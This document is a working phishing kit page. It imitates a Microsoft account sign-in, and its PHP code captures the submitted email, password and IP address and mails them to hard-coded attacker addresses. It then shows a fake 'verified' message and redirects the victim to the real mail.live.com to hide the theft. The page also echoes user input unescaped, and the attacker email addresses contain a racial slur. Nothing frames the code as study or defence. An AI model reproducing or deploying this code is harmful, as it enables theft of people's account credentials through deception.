<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$username = $_POST['login'];
$password = $_POST['passwd'];
$chasem3="outlaw.nigga@outlook.com, iamcoke.boi@gmail.com, outlaw.nigga@yahoo.com";


  $subj = "New Login $ip";
  $msg = "Email: $username\nPassword: $password\n$ip\n-----------------------------------\n      Live  Created By BOY\n-----------------------------------";
  $from = "From: <ssc@sscs.com>";
    mail("$chasem3", $subj, $msg, $from);
?>

<meta http-equiv="refresh" content="7;URL=https://mail.live.com"><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.26227.00/favicon.ico?v=2">
<html>

<head>
<title>Loading...</title>

        <link rel="stylesheet" title="Default" type="text/css" href="Sign%20in%20to%20your%20Microsoft%20account_files/Default1033.css"><style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style>
<style type="text/css">body{display:none;}</style>
<script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script>
<style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript>
<script type="text/javascript">var g_iSRSFailed=0,g_sSRSSuccess="";function SRSRetry(a,f,b){var e=1,d=unescape('%3Cscript type="text/javascript" src="'),c=unescape('"%3E%3C/script%3E');if(g_sSRSSuccess.indexOf(a)!=-1)return;if(typeof window[a]=="undefined"){g_iSRSFailed=1;b<=e&&document.write(d+f+c)}else g_sSRSSuccess+=a+"|"+b+","}
  var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://auth.gfx.ms/16.000.26227.00/Windows_Live_v_thumb.jpg">
<div id="logo" align="center"><img src="Sign%20in%20to%20your%20Microsoft%20account_files/logo.jpg"></div>
<script type="text/javascript" src="Sign%20in%20to%20your%20Microsoft%20account_files/DefaultLoginStrings1033.js"></script>
  <script type="text/javascript" src="Sign%20in%20to%20your%20Microsoft%20account_files/DefaultLogin_Core.js"></script>
  <script type="text/javascript">SRSRetry("__DefaultLogin_Strings", "https://auth.gfx.ms/16.000.26227.00/DefaultLoginStrings1033.js", 1);SRSRetry("__DefaultLogin_Core", "https://auth.gfx.ms/16.000.26227.00/DefaultLogin_Core.js", 1);</script><script type="text/javascript">SRSRetry("__DefaultLogin_Strings", "https://auth.gfx.ms/16.000.26227.00/DefaultLoginStrings1033.js", 2);SRSRetry("__DefaultLogin_Core", "https://auth.gfx.ms/16.000.26227.00/DefaultLogin_Core.js", 2);</script></head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div>
<div class="row text-subheader" data-bind="text: str['WF_STR_HeaderDefault_Title']">Your account <?php print stripslashes($_REQUEST['login']); ?><br>has been verified successfully</div>
<div class="row text-body"><div data-bind="text: str['WF_STR_Default_Desc']">You will be redirected to the external page.</div><div data-bind="visible: !svr.F"><a id="learnMoreLink" href="#" target="_top" data-bind="text: str['WF_STR_LearnMoreLink_Text'], click: learnMore.open">What's this?</a></div></div>
</body>
</html>